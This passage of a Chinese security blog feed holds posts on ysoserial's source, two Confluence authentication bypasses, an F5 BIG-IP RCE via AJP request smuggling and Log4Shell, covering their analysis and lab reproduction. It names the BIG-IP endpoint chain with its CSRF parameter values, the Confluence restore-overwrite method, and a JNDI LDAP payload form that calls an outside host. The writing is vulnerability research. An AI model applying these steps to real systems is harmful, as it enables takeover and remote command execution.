class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br><span class="hljs-keyword">return</span> deserialize(in);<br>&#125;<br><br><span class="hljs-comment">// readobject</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream in)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br><span class="hljs-keyword">return</span> objIn.readObject();<br>&#125;<br><br><span class="hljs-comment">// 入口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> args.length == <span class="hljs-number">0</span> ? System.in : <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(args[<span class="hljs-number">0</span>]));<br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> deserialize(in);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Serializer类"><a href="#Serializer类" class="headerlink" title="Serializer类"></a>Serializer类</h2><p>这个类封装了yso中经常使用的序列化操作，提供便捷，和上面的<code>Deserializer</code>类很相似，不过多说明。</p><h2 id="GeneratePayload类"><a href="#GeneratePayload类" class="headerlink" title="GeneratePayload类"></a>GeneratePayload类</h2><p>名字上看就是生成<code>Payload</code>使用的类，简单说下。</p><ul><li><code>mian</code>方法</li></ul><p><code>mian</code>方法接受命令行参数来选择链和命令，然后实例化并序列化后返回，如果失败则返回前面定义好的状态码然后退出程序。</p><ul><li><code>printUsage</code>方法</li></ul><p>用来打印yso的使用方法，不过多说了。</p><h2 id="Strings类"><a href="#Strings类" class="headerlink" title="Strings类"></a>Strings类</h2><p>这个类就是将一些常用的字符串方法进行一个封装，如连接，重复，格式化、比较操作。</p><h1 id="Yso是如何运作的？"><a href="#Yso是如何运作的？" class="headerlink" title="Yso是如何运作的？"></a>Yso是如何运作的？</h1><p>那么说了上面很多的包以及类，肯定有的小伙伴听完还是一头雾水，下面就用一张图说明下yso具体是怎么运作的吧！</p><img src="/2023/11/12/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20231112221509445.png" class="" title="image-20231112221509445"><p>由控制台进行输入，获取<code>gadget</code>和需要执行的命令传入到入口<code>GeneratePayload</code>中，然后由<code>GeneratePayload</code>调用具体的<code>ObjectPayload</code>接口的实现来获取实例，在这个过程中<code>ObjectPayload</code>又去调用了<code>Gadgets</code>、<code>Reflections</code>等进行初始化然后将对象返回给<code>GeneratePayload</code>，最后<code>GeneratePayload</code>调用<code>Serializer</code>的序列化方法将其序列化后返回并打印到控制台。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
      <category>工具分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian&#39;s Confluence</title>
    <link href="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/"/>
    <url>/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence"><a href="#CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence" class="headerlink" title="CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence"></a>CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在Confluence中存在权限验证漏洞，攻击者可以通过发送而已请求来获取服务器权限，造成远程命令执行。</p><p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><p>！！！！注意，测试该漏洞会导致数据不可逆损失，如需测试漏洞请一定要使用测试环境！！！！</p><p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和上次一样，老样子diff一下：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183007793.png" class=""><p>修改很多，不过最引人注目的还是很多class文件都新增了两个注解，看起来就是对权限做了处理：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183544278.png" class="" title="image-20231031183544278"><p>那么就来了解下什么是<code>websudo</code>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">WebSudo</span> 是 Atlassian Confluence中的一项安全特性。它的目的是确保用户在执行一些敏感操作之前重新验证自己的凭据，以提高系统的安全性。<br><br>当一个已登录的用户试图进行一些可能对系统有重大影响的操作，例如更改系统设置、安装插件等，Confluence 会要求该用户重新输入密码来确认他们的身份。这种再次确认身份的机制称为 WebSudo。<br><br>因为和sudo很像，所以就叫了websudo。<br></code></pre></td></tr></table></figure><p>看来关键点就在权限上了，再根据长亭的通告，因为confluence滥用了struts的继承关系，所以导致了部分权限绕过，并且漏洞利用会导致数据丢失。</p><p>在diff代码的时候看到了如下内容，最开始的思路是直接通过<code>bootstrap</code>来把<code>confluence</code>的数据库切换到自己的数据库上（当然当时我并不了解confluence的bootstrap是干嘛的），走了弯路，后来想了想这样的话也不会丢失数据无法恢复，应该是一种覆盖的操作才对：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102142344827.png" class="" title="image-20231102142344827"><p>既然说到了权限问题，这里可以简单了解下：</p><p><a href="https://struts.apache.org/core-developers/namespace-configuration">https://struts.apache.org/core-developers/namespace-configuration</a></p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231101024742977.png" class="" title="image-20231101024742977"><p>实际上<code>confluence</code>不光是会去<code>defualt</code>来进行检查，而是会去被继承的<code>namespace</code>逐层递归到<code>default</code>，所以寻找继承了<code>admin</code>的<code>namespace</code>最后发现<code>struts.xml</code>中有这么一段：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102135950080.png" class="" title="image-20231102135950080"><p>说明<code>json</code>的命名空间可以进行递归到admin，也就是通告中说的滥用继承关系导致部分权限绕过。</p><p>那么接下来就明了了，只需要寻找能够破坏数据的功能就可以了，实在是不想看官方文档，让我们感谢人工智能：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143252681.png" class=""><p>很好，接下来就可以去confluence里面看备份相关的东西了：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143651277.png" class="" title="image-20231102143651277"><p>经过了几次创建和还原可以确定这里确实能够还原admin的密码（毕竟是备份）。</p><p>直接创建一个备份并且下载下来，然后去搜索restore相关的action，最终在不断地尝试下定位到了一个action：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143924658.png" class="" title="image-20231102143924658"><p>尝试用<code>json</code>命名空间去访问这个action，得到了一些有趣的东西（注意这里要用POST进行访问）：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144319982.png" class="" title="image-20231102144319982"><p>看到下面是我创建的很多备份文件，但是这里其实是有坑的，在直接构造一个文件上传包的时候，对面返回的相应是这样的：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144656162.png" class="" title="image-20231102144656162"><p>很奇怪，我明明创建的是<code>site</code>的包，为什么说我尝试恢复<code>space</code>，又创建了几个无果后，觉得还是要去看看代码，直接搜索提示语：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144818992.png" class="" title="image-20231102144818992"><p>然后进入<code>SetupRestoreAction.class</code>下个断点，可以看到导致这个问题的原因是<code>validate()</code>方法检验了一下<code>exportScope</code>是否是<code>ALL</code>，但是我们创建的是<code>SITE</code>好家伙，这哪有ALL的包啊：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102152808970.png" class="" title="image-20231102152808970"><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102150744866.png" class=""><p>（其实在这里直接改成ALL应该接可以了）</p><p>但是我想找到根本原因，问题只能是出在备份的时候了，发现在confluence的备份中其实只有两个选项：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154048341.png" class="" title="image-20231102154048341"><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154111144.png" class="" title="image-20231102154111144"><p>这个时候就要用另一个接口了：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161124328.png" class="" title="image-20231102161124328"><p>在登陆状态下访问<code>json/backup.action</code>然后生成的被分包所带的是<code>ALL</code>标签，再次构造包：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161312582.png" class="" title="image-20231102161312582"><p>可以看到跳转地址和struts.xml写的一样，这里要注意<code>synchronous=true</code>的设置，发送完包后等待一小会儿，就会将备份导入，当然原先设置好的管理员账号密码也会被备份中的内容覆盖。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>参考历史漏洞即可RCE，老生常谈，不过多说啦。</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-46747 F5 BIG-IP RCE</title>
    <link href="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/"/>
    <url>/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-46747-F5-BIG-IP-RCE"><a href="#CVE-2023-46747-F5-BIG-IP-RCE" class="headerlink" title="CVE-2023-46747 F5 BIG-IP RCE"></a>CVE-2023-46747 F5 BIG-IP RCE</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>全版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接<a href="https://my.f5.com/manage/s/downloads?productFamily=BIG-IP&productLine=big-ip_v15.x&version=15.1.8&container=Virtual-Edition&files=BIGIP-15.1.8-0.0.7.ALL-vmware.ova&locations=JAPAN">下载</a>镜像用vmware启动即可。</p><p>默认账号密码为：admin&#x2F;default</p><h2 id="漏洞分析-复现"><a href="#漏洞分析-复现" class="headerlink" title="漏洞分析&amp;&amp;复现"></a>漏洞分析&amp;&amp;复现</h2><p>通过官方的修复补丁可以看出来和权限验证相关，并且修改了<code>proxy_ajp_conf</code>文件中的内容，再结合已有信息推测这是一个AJP走私问题（然而就在初步验证成功的时候chen师傅发了一句话……）</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030183353275.png" class="" title="image-20231030183353275"><p>擦，点开一看竟然是poc，看了下poc和&#x2F;usr&#x2F;share&#x2F;tomcat&#x2F;conf&#x2F;server.xml</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030183853806.png" class="" title="image-20231030183853806"><p>省了很多事，这下确定了是AJP走私的问题，因为BIG-IP的Apache是基于Apache 2.4.6的定制版，所以也会受AJP走私的影响。</p><p>AJP走私大家并不陌生，比如ghostcat和CVE-2022-26377这类的漏洞就是AJP走私造成的，那么接下来的利用就比较简单了：</p><ol><li><p>在BIG-IP的历史漏洞<a href="https://xz.aliyun.com/t/11418#toc-7">CVE-2022-1388</a>中得知，我们可以从<code>/mgmt/tm/util/bash</code>来执行命令，但是当时是基于<code>X-F5-Auth-Token</code>权限的绕过，那么既然权限绕过已经修复了，我们就需要一个可以通过认证的<code>X-F5-Auth-Token</code>，那么也就是需要创建一个管理员用户。</p></li><li><p>那么创建账户这个问题就来到了tmui上，我们通过AJP走私到<code>/tmui/Control/form</code>调用<code>/tmui/system/user/create.jsp</code>来创建一个新的用户。</p></li><li><p>参考<a href="https://clouddocs.f5.com/products/big-iq/mgmt-api/v5.4/ApiReferences/bigiq_api_ref/r_auth_login.html">官方文档</a>的方式，创建完新的用户之后就可以通过<code>/mgmt/shared/authn/login</code>然后返回第一步来执行命令。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030230918856.png" class="" title="image-20231030230918856"></li></ol><p>流程概括下来就是：通过<code>/tmui/Control/form</code>来调用<code>user/create.jsp</code>然后从<code>/mgmt/shared/authn/login</code>获取新的token，最后在<code>/mgmt/tm/util/bash</code>执行命令。</p><p>这其中有一个需要注意的点：</p><p>tmsh中进行了csrf检测，所以在第一步调用的时候需要构造好三个参数<code>_timenow</code> <code> Tmui-Dubbuf</code>和<code>_bufvalue</code>，满足<code>_bufvalue</code>的值等于<code>Tmui-Dubbuf</code>+<code>Tmui-Dubbuf</code>。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030221855165.png" class="" title="image-20231030221855165"><p>在nuclei给的poc中用的是 <code> Tmui-Dubbuf</code>&#x3D;BBBBBBBBBBB、<code>_timenow</code>&#x3D;a、<code>_bufvalue</code>&#x3D;eIL4RUnSwXYoPUIOGcOFx2o00Xc&#x3D;</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030223436120.png" class="" title="image-20231030223436120"><p>我们也使用这三个键值对进行构造，那么最后得到的poc就是：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225639449.png" class=""><p>使用<code>Transfer-Encoding: chunked</code>时，会使用分块传输编码,第一个204就是trunk size的大小，用十进制转换为十六进制后对应516，也就是我们走私请求的长度，最后的0表示结尾，如果不是用https看到的明文如下：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225723604.png" class=""><p>这个步骤需要多试几次，不一定第一次就成功，发现返回的不是登录界面后就可以进行下一步了：</p><p>通过账号密码获取到token的值。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225832110.png" class=""><p>然后执行命令：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225947658.png" class="" title="image-20231030225947658">]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&#39;s Confluence</title>
    <link href="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian&#39;s%20Confluence/"/>
    <url>/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian&#39;s%20Confluence/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence"><a href="#CVE-2023-22515-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence" class="headerlink" title="CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence"></a>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence 是 Atlassian 公司开发的一款团队合作软件，主要用于团队成员共享知识、协作文档和集中存储资料。它广泛应用于各种组织中，不仅是技术团队，还有其他任何需要文档合作或知识共享的团队。</p><p>在8.0.0&lt;CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.2.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.3.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.4.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.5.2中存在权限提升漏洞，导致任意用户可以创建新的管理员账户。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>既然已经修复过了，就按照老样子，分析一下差异，我这里直接用了8.5.1和8.5.2版本的jar来进行分析：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012132908575.png" class="" title="image-20231012132908575"><p>首先重要的变化就是删除和新增了几个类：</p><p>删除：</p><p><code>ServerInfoAction</code>类</p><p><code>ServerInfoFilter</code>类</p><p>新增：</p><p><code>ReadOnlyApplicationConfig</code>类<br><code>ReadOnlySetupPersister</code>类<br>主要是新增的两个类，可以看到两个<code>ReadOnly</code>都继承自原有的类，可以看作是一种“增强”，当使用setter的时候，抛出一个<code>UnsupportedOperationException</code>来拒绝修改，这样就将类变为只读来规避某些风险。</p><p>具体就是在<code>BootstrapStatusProviderImpl</code>的修改中体现的，将原先的<code>this.delegate.getApplicationConfig();</code>改为<code>return new ReadOnlyApplicationConfig(this.delegate.getApplicationConfig());</code></p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012141836976.png" class="" title="image-20231012141836976"><p>那么接下来需要做的就是如何设置这些属性呢？查看<code>interceptors</code>，和官方的描述，这个<code>SafeParametersInterceptor</code>引起了我的注意：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012194917943.png" class=""><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012153302736.png" class="" title="image-20231012153302736"><p>把表单内容注入到<code>action properties</code>，那么八九不离十就是这玩意了，里面都是一些安全检查相关的，尤其是检查<code>@ParameterSafe</code>这个注解，并且有这么一段<code>doInterceptor</code>：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012195013625.png" class="" title="image-20231012195013625"><p>这下可好了，那么就直接去看父类，但是点了一下竟然提示我<code>Cannot find declaration to go to</code>由于比较懒，直接上google搜索一下文档，然后上Github翻源码去了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012161818082.png" class="" title="image-20231012161818082"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012160933343.png" class="" title="image-20231012160933343"><p>看到了具体源码后就明白了，前面获取<code>action</code>信息后仅仅判断了<code>NoParameters</code>就进行了<code>setParameters</code>，这就很明了了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012162618100-1697122530365-2.png" class="" title="image-20231012162618100"><p>struts系列的漏洞处理流程interceptor—Action</p><p>这段XML配置定义了一个名为<code>params</code>的拦截器，并指定了该拦截器的具体实现类为<code>com.atlassian.xwork.interceptors.SafeParametersInterceptor</code></p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173735463.png" class="" title="image-20231012173735463"><p>然后就是寻找触发点，直接搜索<code>params</code>，看来确实有所发现：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173531182.png" class="" title="image-20231012173531182"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173550112.png" class="" title="image-20231012173550112"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204057094.png" class="" title="image-20231012204057094"><p>看了看所有的<code>stack</code>，只要下面的<code>action</code>用的不是<code>setupStack</code>就都可以使用，多试试应该就可以了（我尝试后发现只有<code>validatingStack</code>或者什么都不写的用默认的才可以成功，其他的可以进倒是，但是没法创建用户，不知道为啥）：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204203122.png" class="" title="image-20231012204203122"><p>到这里漏洞分析就结束了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先弄个环境：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012114259263.png" class="" title="image-20231012114259263"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012163733457.png" class="" title="image-20231012163733457"><p><code>sqlserver</code>版本太低，直接放弃复现（不是</p><p>最后选择弄个<code>PostgreSQL</code>来代替吧：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012172942216.png" class="" title="image-20231012172942216"><p>然后就成功进入初始界面了，打开bp，然后浏览器访问<code>/setup/setupadministrator-start.action</code>发现已经没办法进入注册流程了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204451547.png" class=""><p>覆盖属性后刷新，发现已经可以重新设置管理员了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012210036843.png" class=""><p>新建完成，查看结果：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012205136650.png" class="" title="image-20231012205136650"><p>关于RCE已经有师傅提到了，我打算再看看有没有什么更加方便的方式，如果有发现再发文。</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4Shell</title>
    <link href="/2023/09/28/Log4Shell/"/>
    <url>/2023/09/28/Log4Shell/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4Shell"><a href="#Log4Shell" class="headerlink" title="Log4Shell"></a>Log4Shell</h1><p>配套代码在：<a href="https://github.com/springkill/top50vulns_2023">top50vulns_2023</a>配合食用更佳！</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>本漏洞是因为log4j官方提供了一个名为<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Message Lookup Substitution</a>的功能，此功能会动态地获取某些内容：<br>如字符串<code>Running $&#123;java:runtime&#125;</code>会被解析为<code>Running Java version 1.8xxx</code>.</p><p>官方文档中对此的部分描述如下：</p><p>The JavaLookup allows Java environment information to be retrieved in convenient preformatted strings using the <code>java:</code> prefix.</p><p>使用如下内容可以检索Java相关信息：</p><table><thead><tr><th align="left">Key</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">version</td><td align="left">The short Java version, like:<code>Java version 1.7.0_67</code></td></tr><tr><td align="left">runtime</td><td align="left">The Java runtime version, like:<code>Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation</code></td></tr><tr><td align="left">vm</td><td align="left">The Java VM version, like:<code>Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)</code></td></tr><tr><td align="left">os</td><td align="left">The OS version, like:<code>Windows 7 6.1 Service Pack 1, architecture: amd64-64</code></td></tr><tr><td align="left">locale</td><td align="left">System locale and file encoding information, like:<code>default locale: en_US, platform encoding: Cp1252</code></td></tr><tr><td align="left">hw</td><td align="left">Hardware information, like:<code>processors: 4, architecture: amd64-64, instruction sets: amd64</code></td></tr></tbody></table><p>同时官方也提供了JNDI功能来调用远程方法：</p><h3 id="JNDI-Lookup"><a href="#JNDI-Lookup" class="headerlink" title="JNDI Lookup"></a>JNDI Lookup</h3><p>As of Log4j 2.17.0 JNDI operations require that <code>log4j2.enableJndiLookup=true</code> be set as a system property or the corresponding environment variable for this lookup to function. See the <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#enableJndiLookup">enableJndiLookup</a> system property.</p><p>The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp&#x2F;env&#x2F;, however if the key contains a “:” no prefix will be added.</p><p>The JNDI Lookup only supports the java protocol or no protocol (as shown in the example below).</p><p>使用如下方式开启JNDI检索：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">File</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Application&quot;</span> <span class="hljs-attr">fileName</span>=<span class="hljs-string">&quot;application.log&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d %p %c&#123;1.&#125; [%t] $$&#123;jndi:logging/context-name&#125; %m%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">PatternLayout</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">File</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也正是提供了JNDI查找的功能，导致了漏洞的出现。</p><p>当<code>JNDI</code>与 <code>LDAP</code> 协议搭配使用时，将从远程源获取指定的 Java 类并将其反序列化，在此过程中执行该类的一些代码，造成反序列化攻击。<br>payload形式例如：<code>$&#123;jndi:ldap://ip:port&#125;</code></p><h2 id="漏洞分析-复现"><a href="#漏洞分析-复现" class="headerlink" title="漏洞分析&amp;&amp;复现"></a>漏洞分析&amp;&amp;复现</h2><p>先写一个demo来实现log4Shell。</p><p>在log4j2中存在一个接口名为StrLookup：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.logging.log4j.core.lookup;<br><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.LogEvent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StrLookup</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CATEGORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lookup&quot;</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(String key)</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(LogEvent event, String key)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当在log4j2中使用了如<code>$&#123;prefix:key&#125;</code>的类型时，就会调用相应的<code>StrLookup</code>。</p><p>这个接口被以<code>Map&lt;String,StrLookup&gt;</code>的方式封装在了<code>Interpolator</code>中，可以在项目代码的<code>断点1</code>处打断点观察封装在<code>Interpolator</code>内部的<code>StrLookup</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 